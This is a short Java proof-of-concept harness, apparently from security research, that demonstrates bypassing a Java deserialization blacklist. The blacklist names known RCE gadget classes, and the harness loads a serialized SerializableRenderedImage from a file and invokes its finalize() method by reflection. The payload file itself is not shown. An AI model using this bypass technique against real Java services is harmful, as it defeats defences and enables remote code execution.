package cn.rui0.bypass;

import javax.media.jai.remote.SerializableRenderedImage;
import java.io.*;
import java.lang.reflect.Method;
import java.util.HashSet;
import java.util.Set;

/**
 * Created by ruilin on 2020/2/18.
 * 利用"后反序列化漏洞"绕过反序列化黑名单
 */
class DeserializeBypass {
    private static void callFinalize(Object obj, Class<?> objClass) throws Exception {
        Method finalize = objClass.getDeclaredMethod("finalize", new Class[]{});
        finalize.setAccessible(true);
        finalize.invoke(obj, new Object[]{});
    }

    private static void callFinalize(Object obj) throws Exception {
        Class<?> objClass = obj.getClass();
        callFinalize(obj, objClass);
    }
    public static void main(String[] args) throws Exception {
        // 设置黑名单拦截RCE的链
        Set blacklist = new HashSet() {{
            add("javax.management.BadAttributeValueExpException");
            add("org.apache.commons.collections.keyvalue.TiedMapEntry");
            add("org.apache.commons.collections.functors.ChainedTransformer");
        }};



        BlacklistObjectInputStream ois = new BlacklistObjectInputStream(new FileInputStream("testBypass.ser"),blacklist);
        SerializableRenderedImage s = (SerializableRenderedImage) ois.readObject();
        callFinalize(s);
        ois.close();
        System.out.println("test");
    }
}

